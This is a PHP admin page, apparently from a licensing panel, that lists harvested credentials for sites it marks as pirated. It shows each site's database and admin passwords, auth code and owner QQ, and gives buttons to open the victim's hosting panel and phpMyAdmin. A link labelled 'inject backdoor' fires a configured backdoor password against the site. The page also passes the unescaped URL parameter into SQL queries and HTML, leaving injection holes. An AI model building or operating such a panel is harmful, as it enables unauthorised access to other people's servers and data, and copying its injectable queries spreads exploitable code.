<?php
/**
 * 获取密码NEW
**/
$mod='blank';
include("../includes/common.php");
$title='获取密码(响应时间久)';
include './head.php';
if($islogin==1){}else exit("<script language='javascript'>alert('您还未登录,请先登录才能进入！');window.location.href='./login.php';</script>");
echo '<div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">';
$url = $_GET['url'];

$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' limit 1");
if($row['active'] != 1){}else exit("<script language='javascript'>alert('此站点位于正版列表内！');history.go(-1);</script>");

$db=$DB->get_row("SELECT * FROM auth_block WHERE url='$url' limit 1");
$city=get_ip_city($clientip);
$DB->query("insert into `auth_log` (`uid`,`type`,`date`,`city`,`data`) values ('".站长.$user."','查看盗版密码','".$date."','".$city."','".$clientip."|".$url."')");
?>
<div class="block">
<div class="block-title"><h3 class="panel-title">获取密码（NEW）</h3></div>
          <ul class="list-group">
            <li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>站点网址：</b> <?=$url?></a></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>数据库账号：</b><?=$db['user']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>数据库名：</b><?=$db['db']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-lock"></span> <b>数据库密码：</b><?=$db['pwd']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-search"></span> <b>版本：</b><?=$db['ver']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-download"></span> <b>授权码：</b><?=$db['authcode']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>违规者QQ：</b><?=$db['qq']?></li>
            <li class="list-group-item"><span class="fa fa-globe sidebar-nav-icon"></span> <b>服务器IP：</b><?php
$result = file_get_contents("https://api.169740.com/api/web.ping?host=$url");
$arr=json_decode($result,true);
if ($arr['code']==1) {
    echo $arr['ip'];
} else {
    echo 服务器禁止Ping或被打死;
}
?></li>
            <li class="list-group-item"><span class="fa fa-thumbs-o-up sidebar-nav-icon"></span> <b>服务器地址：</b><?php
$result = file_get_contents("https://api.169740.com/api/web.ping?host=$url");
$arr=json_decode($result,true);
if ($arr['code']==1) {
    echo $arr['location'];
} else {
    echo 服务器禁止Ping或被打死;
}
?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-cloud"></span> <b>后台账号：</b><?=$db['admin_user']?></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-remove"></span> <b>后台密码：</b><?=$db['admin_pass']?></li> 
            <li class="list-group-item"><span class="glyphicon glyphicon-time"></span> <b>入库时间：</b><?=$db['date']?> </li>
<li class="list-group-item"><span class="glyphicon glyphicon-list"></span> <b>功能操作：</b>
<a href="/api/jump.php?url=http://<?=urlencode($url)?>" class="btn btn-xs btn-warning" target="_blank">进入网站</a>   
<a href="/api/jump.php?url=http://<?php
$result = file_get_contents("https://api.169740.com/api/web.ping?host=$url");
$arr=json_decode($result,true);
if ($arr['code']==1) {
    echo $arr['ip'];
} else {
    echo $url;
}
?>:3312/vhost" class="btn btn-xs btn-danger" target="_blank">进入主机</a>
<a href="/api/jump.php?url=http://<?php
$result = file_get_contents("https://api.169740.com/api/web.ping?host=$url");
$arr=json_decode($result,true);
if ($arr['code']==1) {
    echo $arr['ip'];
} else {
    echo $url;
}
?>:3313/mysql/index.php" class="btn btn-xs btn-primary" target="_blank">进入数据库</a>
<a href="/api/jump.php?url=http://<?=urlencode($url)?><?php echo $conf['hmdz']?>?<?php echo $conf['hmpass']?>" class="btn btn-xs btn-success" target="_blank">注入后门</a>
</li>
</ul>
</div>
</div>